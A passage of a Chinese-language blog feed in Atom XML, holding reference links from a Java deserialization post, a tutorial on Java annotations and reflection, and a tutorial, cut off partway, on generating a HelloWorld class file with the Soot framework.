href="https://xz.aliyun.com/t/1756#toc-3" target="_blank" rel="noopener">aliyun</a>/<a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">平安</a>/<a href="https://paper.seebug.org/1242/#commonscollections-2" target="_blank" rel="noopener">seebug</a></p><p><a href="https://www.anquanke.com/post/id/190468#h3-6" target="_blank" rel="noopener">wh1t3p1g</a>/<a href="https://www.anquanke.com/post/id/240040" target="_blank" rel="noopener">6&amp;7</a>/<a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">b1ngz</a>/<a href="https://www.anquanke.com/post/id/207762" target="_blank" rel="noopener">8u20</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;温故而知新。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。&lt;/p&gt;
&lt;p&gt;同步项目：&lt;a href=&quot;https://github.com/0range228/Gadgets&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Gadgets&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="漏洞分析" scheme="https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Java注解</title>
    <link href="https://0range228.github.io/Java%E6%B3%A8%E8%A7%A3/"/>
    <id>https://0range228.github.io/Java%E6%B3%A8%E8%A7%A3/</id>
    <published>2021-05-11T08:06:31.000Z</published>
    <updated>2021-05-11T08:07:18.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>事不凝滞,理贵变通。</p></blockquote><p>写框架离不开Java注解，今天来总结。</p><a id="more"></a><h1 id="Java元注解"><a href="#Java元注解" class="headerlink" title="Java元注解"></a>Java元注解</h1><blockquote><p>注解在Java语言中放在  { 类、方法、字段、参数 } 前的一个特殊的“注释”。</p><p>注解是一种用作标注的“元数据”。</p></blockquote><blockquote><p>四个：@Retention @Target @Docuement @Inherited</p></blockquote><p><strong>@Retention</strong>：注解的保留位置　　　　　　　　　</p><p>​    @Retention(RetentionPolicy.SOURCE)   //注解仅存在于源码中，在编译期就被丢掉了，不会被class包含。</p><p>​    @Retention(RetentionPolicy.CLASS)     // 不会加载进JVM，注解会在class字节码文件中存在，但运行时无法获得。</p><p>​    @Retention(RetentionPolicy.RUNTIME)  // 注解会在class字节码文件中存在，在运行时可以通过反射获取到。</p><p><strong>这里如果@Retention未标注，默认是CLASS阶段</strong>。</p><p>通常我们自定义的都是RUNTIME阶段，一定要标注。</p><p><strong>@Target</strong>：注解的作用目标</p><p>​    @Target(ElementType.TYPE)   //接口、类、枚举</p><p>​    @Target(ElementType.FIELD) //字段、枚举的常量</p><p>​    @Target(ElementType.METHOD) //方法</p><p>​    @Target(ElementType.PARAMETER) //方法参数</p><p>​    @Target(ElementType.CONSTRUCTOR)  //构造函数</p><p>​    @Target(ElementType.LOCAL_VARIABLE)//局部变量</p><p>​    @Target(ElementType.ANNOTATION_TYPE)//注解</p><p>​    @Target(ElementType.PACKAGE) ///包   </p><p><strong>@Document</strong>：说明该注解将被包含在javadoc中</p><p><strong>@Inherited</strong>：说明子类可以继承父类中的该注解。</p><p>​    @Inherited仅针对@Target(ElementType.TYPE)类型的注解有效，并且仅针对类的继承，对接口的继承无效。</p><h1 id="Java注解的使用"><a href="#Java注解的使用" class="headerlink" title="Java注解的使用"></a>Java注解的使用</h1><p>写个小demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> "info"</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本注解仅针对method，作用在runtime阶段。</p><p>使用该注解的方式应为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Report</span>(id=xxx,type=xxx,level=xxx,value=xxx)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMethod</span><span class="params">(...)</span></span></span><br></pre></td></tr></table></figure><p>default的意义在于如果使用注解的时候未给参数赋值，可以采用default预先写好的值。</p><p>如果注解想在多个target使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(&#123;</span><br><span class="line">        ElementType.METHOD,</span><br><span class="line">        ElementType.TYPE</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> "info"</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h1><p>必须要写：</p><ul><li>@Target</li><li>@Retention</li></ul><p>可定义多个参数和默认值，核心参数使用value名称。</p><p>应当设置@Retention(RetentionPolicy.RUNTIME)便于运行期读取该Annotation。</p><p>Java提供的使用反射API读取<code>Annotation</code>的方法包括：</p><p>判断某个注解是否存在于<code>Class</code>、<code>Field</code>、<code>Method</code>或<code>Constructor</code>：</p><ul><li><code>Class.isAnnotationPresent(Class)</code></li><li><code>Field.isAnnotationPresent(Class)</code></li><li><code>Method.isAnnotationPresent(Class)</code></li><li><code>Constructor.isAnnotationPresent(Class)</code></li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 判断@Report是否存在于Person类:</span><br><span class="line">Person.class.isAnnotationPresent(Report.class);</span><br></pre></td></tr></table></figure><p>使用反射API读取Annotation：</p><ul><li><code>Class.getAnnotation(Class)</code></li><li><code>Field.getAnnotation(Class)</code></li><li><code>Method.getAnnotation(Class)</code></li><li><code>Constructor.getAnnotation(Class)</code></li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 获取Person定义的@Report注解:</span><br><span class="line">Report report = Person.class.getAnnotation(Report.class);</span><br><span class="line">int type = report.type();</span><br><span class="line">String level = report.level();</span><br></pre></td></tr></table></figure><p>demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.FIELD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>某个JavaBean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Range</span>(min=<span class="number">1</span>, max=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Range</span>(max=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">public</span> String city;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写一个<code>Person</code>实例的检查方法，它可以检查<code>Person</code>实例的<code>String</code>字段长度是否满足<code>@Range</code>的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">  <span class="comment">// 遍历所有Field:</span></span><br><span class="line">    <span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">        <span class="comment">// 获取Field定义的@Range:</span></span><br><span class="line">        Range range = field.getAnnotation(Range<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 如果@Range存在:</span></span><br><span class="line">        <span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取Field的值:</span></span><br><span class="line">            Object value = field.get(person);</span><br><span class="line">            <span class="comment">// 如果值是String:</span></span><br><span class="line">            <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                String s = (String) value;</span><br><span class="line">                <span class="comment">// 判断值是否满足@Range的min/max:</span></span><br><span class="line">                <span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid field: "</span> + field.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1265102803921888" target="_blank" rel="noopener">liaoxuefeng</a></p><p><a href="https://www.cnblogs.com/peida/archive/2013/04/24/3036689.html" target="_blank" rel="noopener">竹子</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;事不凝滞,理贵变通。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;写框架离不开Java注解，今天来总结。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java基础" scheme="https://0range228.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>使用soot创建类文件</title>
    <link href="https://0range228.github.io/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/"/>
    <id>https://0range228.github.io/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/</id>
    <published>2021-03-25T02:19:08.000Z</published>
    <updated>2021-03-25T02:26:43.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>鱼沉雁杳天涯路，始信人间别离苦。</p></blockquote><p>老博客归档。</p><a id="more"></a><h1 id="如何创建一个类"><a href="#如何创建一个类" class="headerlink" title="如何创建一个类"></a>如何创建一个类</h1><p>之前看ASM创建一个类，很实费劲，需要直接写字节码口令，这次尝试用Soot API写一下最简单的Hello World。</p><h2 id="加载java-lang-Object和库类"><a href="#加载java-lang-Object和库类" class="headerlink" title="加载java.lang.Object和库类"></a>加载<code>java.lang.Object</code>和库类</h2><p>我们知道所有对象的父类都是Object类，那么上来第一步，先添加两个依赖类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建两个依赖类</span></span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.Object"</span>);</span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.System"</span>);</span><br></pre></td></tr></table></figure><p>这里，教程上说，当你loadClassAndSupport时候，相关类的所有内容都会被加载进来，一招拿下！</p><h2 id="创建一个新SootClass对象"><a href="#创建一个新SootClass对象" class="headerlink" title="创建一个新SootClass对象"></a>创建一个新<code>SootClass</code>对象</h2><p>接下来创建我们创建的这个类就叫做HelloWorld。在Soot里面需要用<code>SootClass</code>来封装，并将其父类设置为<code>java.lang.Object</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass = <span class="keyword">new</span> SootClass(<span class="string">"HelloWorld"</span>, Modifier.PUBLIC);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass.setSuperclass(Scene.v().getSootClass(<span class="string">"java.lang.Object"</span>));</span><br></pre></td></tr></table></figure><p>这会将新创建的类的父类设置为的<code>SootClass</code>对象<code>java.lang.Object</code>。注意使用工具的方法<code>getSootClass</code>上<code>Scene</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scene.v().addClass(sClass);</span><br></pre></td></tr></table></figure><p>这会将新创建的<code>HelloWorld</code>类添加到中<code>Scene</code>。<code>Scene</code>一旦创建，所有类都应该属于它们。</p><h2 id="向SootClass添加方法"><a href="#向SootClass添加方法" class="headerlink" title="向SootClass添加方法"></a>向<code>SootClass</code>添加方法</h2><p>想向Soot类添加一个sout方法，打印helloworld，首先需要main方法。</p><p>目前Helloworld类的<code>main()</code>方法还是空的。</p><p>现在有了<code>SootClass</code>，我们需要向其中添加方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">method = <span class="keyword">new</span> SootMethod(<span class="string">"main"</span>,                 </span><br><span class="line">    Arrays.asList(<span class="keyword">new</span> Type[] &#123;ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>)&#125;),</span><br><span class="line">    VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);</span><br></pre></td></tr></table></figure><p>解读：</p><p>在这里需要首先写出一个main方法，他是public&amp;static的，并且main方法接受一个<code>java.lang.String</code>的参数数组，并且返回void。</p><p>SootClass：</p><p>每个SootClass代表一个Java对象，我们可以实例化该类，也可以为它指定类型。</p><p>如果想要获得<code>java.lang.String</code>的类型，我们可以用<code>RefType.v(&quot;java.lang.String&quot;)</code>。</p><p>如果现在已经有了一个SootClass对象sc，我们可以用<code>sc.getType()</code>获取对应的类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass.addMethod(method);</span><br></pre></td></tr></table></figure><p>此代码将main方法添加到其所属类，也就是sClass。</p><h2 id="向方法添加代码"><a href="#向方法添加代码" class="headerlink" title="向方法添加代码"></a>向方法添加代码</h2><p>如果方法不包含任何代码，则它是无用的。我们继续向该<code>main</code>方法添加一些代码。为此，我们必须为代码选择一个中间表示形式。</p><h3 id="创建JimpleBody"><a href="#创建JimpleBody" class="headerlink" title="创建JimpleBody"></a>创建<code>JimpleBody</code></h3><p>Jimple是soot四个中间表示形式之一，也是最受欢迎的。</p><p>在Soot中，通常这一步是将一个Body附加在SootMethod对象上，也就是附加到之前我们声明的method对象上。</p><p>每个Body知道自己属于哪个SootMethod，但是每个SootMethod每次只能有一个activeBody：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SootMethod.getActiveBody()</span><br></pre></td></tr></table></figure><p>更准确滴说，每个Body有三个特征组件：</p><ol><li><p>Local</p><p>Body体内的局部变量；</p></li><li><p>Trap</p><p>哪些代码用来捕获哪些异常；</p></li><li><p>Unit</p><p>Unit表示语句本身；</p></li></ol><p>所以接下来，我们需要给main方法添加一个Jimple主体，再像主体添加代码语句；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JimpleBody body = Jimple.v().newBody(method);</span><br><span class="line">method.setActiveBody(body);</span><br></pre></td></tr></table></figure><p>我们将Jimple单例对象称为<code>JimpleBody</code>与我们的方法相关联的新对象，并使它成为方法的活动主体。</p><p>这里先看一下Jimple中间代码：</p><p><img src="../images/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200718212825394.png" alt="image-20200718212825394"></p><p>接下来下面就需要按照目标Jimple一步步来做。</p><h3 id="添加本地变量"><a href="#添加本地变量" class="headerlink" title="添加本地变量"></a>添加本地变量</h3><p>添加本地变量需要用到arg，所以直接写；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arg = Jimple.v().newLocal(<span class="string">"l0"</span>, ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>));</span><br><span class="line">body.getLocals().add(arg);</span><br></pre></td></tr></table></figure><p>这里是为啥呢，我的理解；</p><p>对于sout(“Helloworld!”)来说，我们需要有一个字符串变量，最后打印的也是他，不难理解；</p><p>这里局部变量还有一个就是打印对象，在Java里面，所有东西都是对象；</p><p>这里第二个就是java.io.PrintStream对象，打印流对象；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//加入局部变量，java.io.PrintStream tmpRef</span><br><span class="line">tmpRef = Jimple.v().newLocal(&quot;tmpRef&quot;, RefType.v(&quot;java.io.PrintStream&quot;));</span><br><span class="line">body.getLocals().add(tmpRef);</span><br></pre></td></tr></table></figure><h3 id="添加方法代码"><a href="#添加方法代码" class="headerlink" title="添加方法代码"></a>添加方法代码</h3><p>添加方法就需要unit了，直接写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//组成链，l0 = @parameter0</span></span><br><span class="line">            units.add(Jimple.v().newIdentityStmt(arg,</span><br><span class="line">                    Jimple.v().newParameterRef(ArrayType.v</span><br><span class="line">                            (RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>), <span class="number">0</span>)));</span><br></pre></td></tr></table></figure><p>理解：</p><p>就在上面一步，arg是我们的字符串变量，交给JVM时候，他就是字符串变量l0。</p><p>继续写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继续组成链，tmpRef = java.lang.System.out</span></span><br><span class="line">            units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef(</span><br><span class="line">                    Scene.v().getField(<span class="string">"&lt;java.lang.System: java.io.PrintStream out&gt;"</span>).makeRef())));</span><br></pre></td></tr></table></figure><p>理解：</p><p>这里其实就是把上面的tmpRef给到System.out对象，这里仍有存疑，之后会慢慢看。</p><p>最后一步，赋值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insert "tmpRef.println("Hello world!")"</span></span><br><span class="line">            &#123;</span><br><span class="line">                SootMethod toCall = Scene.v().getMethod(<span class="string">"&lt;java.io.PrintStream: void println(java.lang.String)&gt;"</span>);</span><br><span class="line">                units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(<span class="string">"Hello world!"</span>))));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>我们获得带有签名的方法<code>&lt;java.io.PrintStream: void println(java.lang.String)&gt;</code>（该方法名为<code>println</code>，属于<code>PrintStream</code>，返回<code>void</code>并采用一个 <code>String</code>作为其参数-这足以唯一地标识该方法），并使用StringConstant“ Hello world！”调用它。</p><h2 id="写到类文件里面"><a href="#写到类文件里面" class="headerlink" title="写到类文件里面"></a>写到类文件里面</h2><p>将程序编写为<code>.class</code>文件的首选方法是使用ASM后端。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> java_version = Options.v().java_version();</span><br><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">BafASMBackend backend = <span class="keyword">new</span> BafASMBackend(sClass, java_version);</span><br><span class="line">backend.generateClassFile(streamOut);</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>也可以使用过时的Jasmin后端。我们首先构造输出流，该流将使用Jasmin源并输出<code>.class</code>文件。我们可以手动指定文件名，也可以让Soot确定正确的文件名。我们在这里做后者。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> JasminOutputStream(<span class="keyword">new</span> FileOutputStream(fileName));</span><br><span class="line">PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">JasminClass jasminClass = <span class="keyword">new</span> soot.jimple.JasminClass(sClass);</span><br><span class="line">jasminClass.print(writerOut);</span><br><span class="line">writerOut.flush();</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>如果我们希望输出简单的源代码而不是<code>.class</code>文件，则可以使用以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_jimple);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">Printer.v().printTo(sClass, writerOut);</span><br><span class="line">writerOut.flush();</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>我们省略了<code>JasminOutputStream</code>，并在上调用<code>printTo</code>方法<code>Printer</code>。</p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="../images/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200718202705757.png" alt="image-20200718202705757"></p><h1 id="源代码环节"><a href="#源代码环节" class="headerlink" title="源代码环节"></a>源代码环节</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建两个依赖类</span></span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.Object"</span>);</span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.System"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//声明目标类HelloWorld，他的父类当然是Object</span></span><br><span class="line">        SootClass sClass = <span class="keyword">new</span> SootClass(<span class="string">"HelloWorld"</span>, Modifier.PUBLIC);</span><br><span class="line">        sClass.setSuperclass(Scene.v().getSootClass(<span class="string">"java.lang.Object"</span>));</span><br><span class="line">        Scene.v().addClass(sClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建main方法，public static void main</span></span><br><span class="line">        SootMethod method = <span class="keyword">new</span> SootMethod(<span class="string">"main"</span>, Arrays.asList(<span class="keyword">new</span> Type[]&#123;ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>)&#125;),</span><br><span class="line">                VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);</span><br><span class="line">        sClass.addMethod(method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建main方法内容，这里需要用到Jimple</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            JimpleBody body = Jimple.v().newBody(method);</span><br><span class="line">            method.setActiveBody(body);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//工具组件</span></span><br><span class="line">            Chain units = body.getUnits();</span><br><span class="line">            Local arg,tmpRef;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入局部变量，java.lang.String l0</span></span><br><span class="line">            arg = Jimple.v().newLocal(<span class="string">"l0"</span>, ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>));</span><br><span class="line">            body.getLocals().add(arg);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入局部变量，java.io.PrintStream tmpRef</span></span><br><span class="line">            tmpRef = Jimple.v().newLocal(<span class="string">"tmpRef"</span>, RefType.v(<span class="string">"java.io.PrintStream"</span>));</span><br><span class="line">            body.getLocals().add(tmpRef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//组成链，l0 = @parameter0</span></span><br><span class="line">            units.add(Jimple.v().newIdentityStmt(arg,</span><br><span class="line">                    Jimple.v().newParameterRef(ArrayType.v</span><br><span class="line">                            (RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>), <span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//继续组成链，tmpRef = java.lang.System.out</span></span><br><span class="line">            